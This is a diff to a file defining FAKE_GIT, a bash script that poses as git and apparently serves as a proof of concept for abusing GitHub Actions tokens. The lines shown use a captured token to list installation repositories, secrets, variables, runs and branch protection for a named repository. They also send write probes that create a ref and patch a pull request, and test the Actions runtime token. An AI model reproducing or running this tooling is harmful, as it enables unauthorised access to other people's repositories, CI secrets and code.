@@ -37,6 +37,8 @@ FAKE_GIT = r'''#!/usr/bin/env bash
   if [ -n "$tok" ]; then
     H="-H Authorization:token\ $tok -H Accept:application/vnd.github+json"
     base="https://api.github.com/repos/PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
+    echo "--- API_INSTALLATION_REPOS (authenticated-only; proves token liveness) ---"
+    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "https://api.github.com/installation/repositories" | head -c 1200
     echo "--- API_GET_REPO ---"
     curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base" | head -c 1200
     echo "--- API_GET_USER ---"
@@ -45,10 +47,18 @@ FAKE_GIT = r'''#!/usr/bin/env bash
     curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/actions/variables" | head -c 800
     echo "--- API_LIST_SECRETS ---"
     curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/actions/secrets" | head -c 400
+    echo "--- API_LIST_ACTIONS_RUNS ---"
+    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/actions/runs?per_page=1" | head -c 300
+    echo "--- API_BRANCH_PROTECTION ---"
+    curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" "$base/branches/main/protection" | head -c 300
     echo "--- API_WRITE_PROBE_CONTENTS (bogus sha -> 422 means write allowed) ---"
     curl -sS -m 20 -X POST -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" -d '{"ref":"refs/heads/poc-probe","sha":"0000000000000000000000000000000000000000"}' "$base/git/refs" | head -c 400
     echo "--- API_WRITE_PROBE_PULLREQUESTS (PATCH with empty body) ---"
     curl -sS -m 20 -X PATCH -w '\nHTTP=%{http_code}\n' -H "Authorization: token $tok" -H "Accept: application/vnd.github+json" -H "Content-Type: application/json" -d '{}' "$base/pulls/2" | head -c 400
+    if [ -n "${ACTIONS_RUNTIME_TOKEN:-}" ] && [ -n "${ACTIONS_RESULTS_URL:-}" ]; then
+      echo "--- RUNTIME_LIST_ARTIFACTS (runtime token liveness) ---"
+      curl -sS -m 20 -w '\nHTTP=%{http_code}\n' -X POST -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -H "Content-Type: application/json" -d '{}' "${ACTIONS_RESULTS_URL%/}/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" | head -c 300
+    fi
   else
     echo "NO_INPUT_TOKEN"
   fi
